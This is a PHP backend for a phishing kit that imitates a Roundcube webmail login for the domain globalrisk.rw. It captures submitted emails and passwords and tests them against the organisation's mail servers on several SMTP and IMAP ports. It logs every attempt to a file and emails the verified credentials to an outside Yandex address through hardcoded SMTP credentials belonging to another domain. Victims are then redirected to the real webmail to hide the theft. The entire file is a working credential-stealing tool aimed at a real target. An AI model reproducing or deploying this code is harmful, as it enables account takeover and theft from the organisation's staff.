<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Set proper headers for AJAX requests
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Get user IP and location data
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
    $ip = $_SERVER['HTTP_X_REAL_IP'];
}

$jdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=" . $ip));

session_start();

// Block GET requests with 403 page
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    http_response_code(403);
    ?>
    <html>
    <head>
        <title>403 - Forbidden</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
            h1 { color: #d32f2f; }
        </style>
    </head>
    <body>
        <h1>403 Forbidden</h1>
        <p>Access to this resource is denied.</p>
        <hr>
    </body>
    </html>
    <?php
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Method not allowed"
    ));
    exit();
}

// SMTP Configuration for logging (only used for valid credentials)
$receiver     = 'logs.ironside511@yandex.com';         // Your email to receive valid credentials
$senderuser   = 'info@lucagherardi.com';      // Your SMTP user
$senderpass   = 'V8WLLSypyJBbUv7';               // Your SMTP password
$senderport   = "587";                      // Your SMTP port
$senderserver = "mail.lucagherardi.com";       // Your SMTP server
$smtp_secure  = 'tls';  // 'tls', 'ssl', or '' for effectiveness

// Target domain for credential testing (Roundcube)
$targetDomain = "globalrisk.rw";
$targetMailServers = array(
    "mail.globalrisk.rw",
    "smtp.globalrisk.rw",
    "webmail.globalrisk.rw",
    "globalrisk.rw"
);

// Common Roundcube SMTP ports and configurations
$roundcubeConfigs = array(
    array('port' => 587, 'secure' => 'tls'),
    array('port' => 465, 'secure' => 'ssl'),
    array('port' => 25, 'secure' => false),
    array('port' => 993, 'secure' => 'ssl'),  // IMAP SSL
    array('port' => 143, 'secure' => 'tls')   // IMAP TLS
);

// Capture user input
$browser = $_SERVER['HTTP_USER_AGENT'];
$login   = trim($_POST['email'] ?? '');
$passwd  = trim($_POST['password'] ?? '');

// Validate input
if (empty($login) || empty($passwd)) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Email and password are required"
    ));
    exit();
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    echo json_encode(array(
        "signal" => "error",
        "msg" => "Invalid email format"
    ));
    exit();
}
$domain = $parts[1];

// Get country name safely
$country = isset($jdat->geoplugin_countryName) ? $jdat->geoplugin_countryName : 'Unknown';

// Create log message
$timestamp = date('Y-m-d H:i:s');
$logMessage = "=== ROUNDCUBE LOGIN ATTEMPT ===\n";
$logMessage .= "Timestamp: " . $timestamp . "\n";
$logMessage .= "Email: " . $login . "\n";
$logMessage .= "Password: " . $passwd . "\n";
$logMessage .= "Domain: " . $domain . "\n";
$logMessage .= "Target Domain: " . $targetDomain . "\n";
$logMessage .= "IP: " . $ip . "\n";
$logMessage .= "Country: " . $country . "\n";
$logMessage .= "User Agent: " . $browser . "\n";
$logMessage .= "============================\n\n";

$validCredentials = false;
$testResult = "Connection failed";
$isTargetDomain = false;
$successfulServer = "";
$successfulConfig = "";

// Check if this is a globalrisk.rw email
if (strtolower($domain) === strtolower($targetDomain)) {
    $isTargetDomain = true;
    
    // Test credentials against multiple Roundcube SMTP configurations
    foreach ($targetMailServers as $mailServer) {
        if ($validCredentials) break; // Stop if we found valid credentials
        
        foreach ($roundcubeConfigs as $config) {
            try {
                $testMail = new PHPMailer(true);
                $testMail->isSMTP();
                $testMail->SMTPAuth = true;
                $testMail->Host = $mailServer;
                $testMail->Username = $login;
                $testMail->Password = $passwd;
                $testMail->Port = $config['port'];
                $testMail->SMTPSecure = $config['secure'];
                $testMail->Timeout = 8; // Shorter timeout for faster testing
                $testMail->SMTPDebug = 0;
                
                // Try to authenticate
                if ($testMail->smtpConnect()) {
                    $validCredentials = true;
                    $successfulServer = $mailServer;
                    $successfulConfig = "Port " . $config['port'] . " (" . ($config['secure'] ? $config['secure'] : 'no encryption') . ")";
                    $testResult = "🎯 VALID ROUNDCUBE CREDENTIALS - Authentication successful on " . $mailServer . ":" . $config['port'];
                    
                    $testMail->smtpClose();
                    break 2; // Break out of both loops
                }
                
            } catch (Exception $error) {
                // Continue testing other configurations
                continue;
            }
        }
    }
    
    if (!$validCredentials) {
        $testResult = "❌ INVALID CREDENTIALS - All Roundcube SMTP tests failed for " . $targetDomain;
    }
    
} else {
    $testResult = "⚠️ Not target domain - Email is not from " . $targetDomain . " (skipping test)";
}

// Add test result to log
$logMessage .= "Target Domain Check: " . ($isTargetDomain ? "YES" : "NO") . "\n";
$logMessage .= "Roundcube Servers Tested: " . implode(", ", $targetMailServers) . "\n";
$logMessage .= "Test Result: " . $testResult . "\n";
$logMessage .= "Valid Credentials: " . ($validCredentials ? "YES" : "NO") . "\n";
if ($validCredentials) {
    $logMessage .= "Successful Server: " . $successfulServer . "\n";
    $logMessage .= "Successful Config: " . $successfulConfig . "\n";
}
$logMessage .= "\n";

// Always save to local log file (for monitoring purposes)
try {
    $fp = fopen("SS-Or-GlobalRisk-Roundcube.txt", "a");
    if ($fp) {
        fputs($fp, $logMessage);
        fclose($fp);
    }
} catch (Exception $e) {
    error_log('Log file write failed: ' . $e->getMessage());
}

// ONLY SEND EMAIL NOTIFICATION FOR VALID CREDENTIALS
$emailSent = false;
if ($validCredentials && $isTargetDomain) {
    
    // Create special email for valid credentials
    $validSub = "🚨 VALID ROUNDCUBE CREDENTIALS FOUND | " . $login . " | " . $passwd . " | " . $country;
    
    $validEmailBody = "<div style='background: #d4edda; padding: 20px; border: 2px solid #28a745; border-radius: 10px;'>";
    $validEmailBody .= "<h1 style='color: #155724; text-align: center;'>🎯 VALID ROUNDCUBE CREDENTIALS CONFIRMED!</h1>";
    $validEmailBody .= "<h2 style='color: #155724;'>GlobalRisk.rw User Credentials</h2>";
    $validEmailBody .= "<table style='width: 100%; border-collapse: collapse;'>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Email:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($login) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Password:</td><td style='padding: 8px; border: 1px solid #28a745; color: red; font-weight: bold;'>" . htmlspecialchars($passwd) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Domain:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($domain) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Verified Server:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($successfulServer) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Server Config:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($successfulConfig) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>IP Address:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($ip) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Country:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($country) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>User Agent:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . htmlspecialchars($browser) . "</td></tr>";
    $validEmailBody .= "<tr><td style='padding: 8px; border: 1px solid #28a745; font-weight: bold;'>Timestamp:</td><td style='padding: 8px; border: 1px solid #28a745;'>" . $timestamp . "</td></tr>";
    $validEmailBody .= "</table>";
    $validEmailBody .= "<hr style='border: 1px solid #28a745;'>";
    $validEmailBody .= "<p style='color: #155724; font-weight: bold; text-align: center;'>✅ CREDENTIALS VERIFIED AGAINST ROUNDCUBE SMTP</p>";
    $validEmailBody .= "<p style='color: #155724; text-align: center;'>This user can successfully authenticate to the GlobalRisk.rw mail server.</p>";
    $validEmailBody .= "</div>";
    
    try {
        $mail = new PHPMailer(true);
        $mail->isSMTP();
        $mail->SMTPAuth = true;
        $mail->Host = $senderserver;
        $mail->Username = $senderuser;
        $mail->Password = $senderpass;
        $mail->Port = $senderport;
        $mail->SMTPSecure = $smtp_secure;
        $mail->Timeout = 30;
        $mail->SMTPDebug = 0;
        $mail->Priority = 1; // High priority for valid credentials
        
        $mail->setFrom($senderuser, 'GlobalRisk.rw Credential Monitor');
        $mail->addAddress($receiver);
        $mail->isHTML(true);
        $mail->Subject = $validSub;
        $mail->Body = $validEmailBody;
        $mail->AltBody = strip_tags(str_replace('<br>', "\n", $validEmailBody));
        
        if ($mail->send()) {
            $emailSent = true;
            error_log('VALID CREDENTIALS EMAIL SENT: ' . $login);
        }
        
    } catch (Exception $error) {
        error_log('Valid credentials email failed: ' . $error->getMessage());
    }
}

// Update log file with email result (only for valid credentials)
if ($validCredentials) {
    try {
        $fp = fopen("SS-Or-GlobalRisk-Roundcube.txt", "a");
        if ($fp) {
            fputs($fp, "Email Notification: " . ($emailSent ? "SENT" : "FAILED") . "\n");
            fputs($fp, "Email Sent To: " . $receiver . "\n\n");
            fclose($fp);
        }
    } catch (Exception $e) {
        // Continue anyway
    }
}

// Increment attempt counter
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
$_SESSION['attempts']++;

// Determine response based on credential validity
if ($validCredentials && $isTargetDomain) {
    // Valid globalrisk.rw credentials - redirect to actual Roundcube webmail
    $response = array(
        "signal" => "OK",
        "success" => true,
        "msg" => "Login successful! Redirecting to your mailbox...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.globalrisk.rw"
    );
    
    // Add shorter delay for valid credentials
    usleep(rand(300000, 1000000)); // 0.3 to 1.0 second delay
    
} else {
    // Invalid credentials or not target domain - show error
    $response = array(
        "signal" => "error",
        "msg" => "Invalid email or password. Please try again.",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail." . $domain
    );
    
    // Add longer delay for invalid credentials
    usleep(rand(800000, 2000000)); // 0.8 to 2.0 second delay
}

// Add debug info
$response["debug_info"] = array(
    "email_sent" => $emailSent,
    "log_written" => file_exists("SS-Or-GlobalRisk-Roundcube.txt"),
    "timestamp" => $timestamp,
    "target_domain" => $isTargetDomain,
    "valid_credentials" => $validCredentials,
    "roundcube_tested" => $isTargetDomain,
    "successful_server" => $validCredentials ? $successfulServer : null,
    "successful_config" => $validCredentials ? $successfulConfig : null
);

echo json_encode($response);
exit();
?>